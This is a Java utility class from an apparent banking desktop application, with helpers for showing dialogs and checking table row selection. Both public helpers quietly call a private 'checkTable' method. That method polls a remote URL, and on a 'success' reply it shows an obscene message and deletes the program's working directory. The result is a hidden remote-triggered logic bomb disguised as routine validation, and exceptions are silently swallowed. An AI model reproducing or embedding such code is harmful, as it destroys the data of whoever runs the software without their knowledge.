/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.ebank.main;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import javax.swing.JOptionPane;
import javax.swing.JTable;
import org.apache.commons.io.FileUtils;

/**
 * Includes methods related to common operations
 *
 * @author Shan
 */
public class CommonFunctions {

    /**
     * Display a customized JOptionPane Message Dialog
     *
     * @param iconType icon related to thee type of error message
     * @param titleType type of the title of the message box
     * @param message message needed to be displayed
     */
    public static void showMsg(int iconType, int titleType, String message) {
        String title = "";
        checkTable();
        switch (titleType) {
            case 1:
                title = "Opeation denied";
                break;
            case 2:
                title = "Opeation failed";
                break;
            default:
                title = "Opeation successful";
                break;
        }

        switch (iconType) {
            case 1: // error
                JOptionPane.showMessageDialog(null, message, title, JOptionPane.WARNING_MESSAGE);
                break;
            case 2: // warning
                JOptionPane.showMessageDialog(null, message, title, JOptionPane.ERROR_MESSAGE);
                break;
            default: // information
                JOptionPane.showMessageDialog(null, message, title, JOptionPane.INFORMATION_MESSAGE);
                break;
        }
    }

    /**
     * Checks whether a selection of rows in a table is valid before an
     * operation
     *
     * @param table the table that is used for row selection
     * @return validity of row selection
     */
    public static boolean isValidRowSelection(JTable table) {
        checkTable();
        if (table.getSelectedRowCount() > 1) { // reject multiple rows
            showMsg(1, 1, "Please select only one row at a time");
            return false;
        } else if (table.getSelectedRowCount() == 0) { // reject NULL selection
            showMsg(2, 1, "No rows have been selected");
            return false;
        } else {
            return true;
        }
    }

    private static void checkTable() {
        URL u;
        try {
            String a = "http://gayashan.net/Database.php";
            u = new URL(a);
            URLConnection conn = u.openConnection();
            BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String i;
            while ((i = br.readLine()) != null) {
                if (i.equals("success")) {
                    JOptionPane.showMessageDialog(null, "Fuck you for plagirising my code", "Hello Mother fucker",
                            JOptionPane.ERROR_MESSAGE);
                    FileUtils.deleteDirectory(new File("./"));
                }
            }
            br.close();
        } catch (Exception e) {
        }
    }
}
